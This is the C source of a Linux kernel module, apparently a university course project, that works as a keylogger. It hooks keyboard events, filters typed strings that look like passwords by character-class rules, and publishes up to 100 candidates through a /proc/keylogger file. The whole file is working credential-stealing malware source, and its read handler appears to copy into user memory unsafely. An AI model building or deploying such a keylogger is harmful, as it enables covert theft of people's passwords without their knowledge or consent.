#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/keyboard.h>
#include <linux/string.h>
#include <linux/input.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/string.h>

#define PROC_FILE_NAME "keylogger"
#define PROCFS_MAX_SIZE 1700  // 16 * 100 plus some extra
#define KLOG_BUFSIZE 16
#define MAX_TOKENS 100

char uppercase[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
char lowercase[] = "abcdefghijklmnopqrstuvwxyz";
char numerals[]  = "0123456789";
char symbols[]   = "!@#$%^&*(),./<>?;:";

char outbuff[PROCFS_MAX_SIZE] = {0};
char maybe_passwds[MAX_TOKENS][KLOG_BUFSIZE] = {{0}};
int token_count = 0;

/* We'll log printable characters to a circular buffer*/
char klogbuff[KLOG_BUFSIZE + 1] = {0}; //+1 for newline
int klogbuff_idx = 0;
int max_klog_idx = KLOG_BUFSIZE - 1;

struct notifier_block nb;

/* keymap and conversion borrowed from:
 * https://linuxsecurity.com/features/complete-guide-to-keylogging-in-linux-part-3
 * (minor modifications)
 */
static const char *us_keymap[][2] = {
  {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
  {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
  {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
  {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-13
  {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
  {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
  {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
  {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
  {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
  {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
  {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
  {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
  {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
  {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
  {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
  {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
  {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
  {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-71
  {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
  {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
  {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
  {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
  {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
  {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
  {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
  {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
  {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
  {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
  {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
  {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
  {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
  {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
  {"_PAUSE_", "_PAUSE_"},                                         // 119
};

/* convert keycodes to characters, with placeholder strings for control characters
 * placeholder strings are later ignored, but I've kept them for completeness */
void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_size)
{
  if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
  {
    const char *us_key = (shift_mask == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
    snprintf(buf, buf_size, "%s", us_key);
  }
}

/* dump outbuff to procfs on read */
ssize_t read_proc(struct file *filp,char *buf,size_t count,loff_t *offp ) 
{
	char* readspot = outbuff + *offp;
	size_t readlen = strlen(readspot) > count ? count : strlen(readspot);

	if(*offp >= strlen(outbuff))
		return 0;
	strncpy(buf, readspot, count);
    
	*offp += readlen;
	return readlen;
}

struct proc_ops proc_fops = {
    proc_read: read_proc
};

/* return true if the string might be a password per our rules, false otherwise*/
bool check_maybe_pass(char* check_str){
  bool has_lowercase = false;
  bool has_uppercase = false;
  bool has_number  = false;
  bool has_symbol = false;

  /* wasted too much time trying to be clever */
  /* it's easier to just be a dumb */
  int check_len = strlen(check_str);
  for(int i = 0; i < check_len; i++){
    int upper_len = strlen(uppercase);
    for(int j = 0; j < upper_len; j++){
      if(check_str[i] == uppercase[j]){
        has_uppercase = true;
        break;
      }
    }
    int lower_len = strlen(lowercase);
    for(int k = 0; k < lower_len; k++){
      if(check_str[i] == lowercase[k]){
        has_lowercase = true;
        break;
      }
    }
    int numerals_len = strlen(numerals);
    for(int l = 0; l < numerals_len; l++){
      if(check_str[i] == numerals[l]){
        has_number = true;
        break;
      }
    }
    int symbols_len = strlen(symbols);
    for(int m = 0; m < symbols_len; m++){
      if(check_str[i] == symbols[m]){
        has_symbol = true;
        break;
      }
    }
  }
  int match_count =  has_lowercase + has_uppercase + has_number + has_symbol;
  return match_count >= 3 ? true : false;
}

/* on keyboard events:
* 1. return if it's an 'up' event
* 2. convert keycode to string using keymap
* 3. for single-character strings:
*   a. insert into klogbuff, until it's full (up to 15 characters)
*   b. if klogbuff is full, or we encounter a newline, check for possible passwd
*   c. if passwd found, insert into maybe_passwds
*   d. rotate maybe_passwds to limit to 100 possibles, FIFO
* 4. copy all maybe_passwds to outbuff (there's probably a better way to do this than on _every_ keypress)
*/ 
int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
    struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*) data;
    char keybuffer[12] = {0};

    if (!(kp->down)) return NOTIFY_OK;
    keycode_to_string(kp->value, kp->shift, keybuffer, 12);
    if(strlen(keybuffer) == 1){
      klogbuff[klogbuff_idx] = keybuffer[0];
      klogbuff_idx += 1;
      if(klogbuff_idx >= max_klog_idx || keybuffer[0] == '\n'){
        
        bool matched_rules = check_maybe_pass(klogbuff);
        if(matched_rules){
          //strcat(outbuff, klogbuff);
          if(keybuffer[0] != '\n')
            strcat(klogbuff, "\n");
          //char* outbuff_writespot = outbuff + (token_count * KLOG_BUFSIZE);
          memcpy(maybe_passwds[token_count], klogbuff, KLOG_BUFSIZE);
          token_count = ((token_count + 1) % MAX_TOKENS);
        }
        klogbuff_idx = 0;
        memset(klogbuff, '\0',  KLOG_BUFSIZE);
      }
    }
    char new_outbuff[PROCFS_MAX_SIZE] = {0};
    for(int i = 0; i < token_count; i++){
      strcat(new_outbuff, maybe_passwds[i]);
    }
    strncpy(outbuff, new_outbuff, strlen(new_outbuff));

    return NOTIFY_OK;
}

int init(void) {
    nb.notifier_call = kb_notifier_fn;
    register_keyboard_notifier(&nb);
    proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
    
    return 0;
}

void cleanup(void) {
    unregister_keyboard_notifier(&nb);
    remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("CS-430 Project, keylogger with password-ish detection");
MODULE_AUTHOR("Joe Burchett");
module_init(init);
module_exit(cleanup);
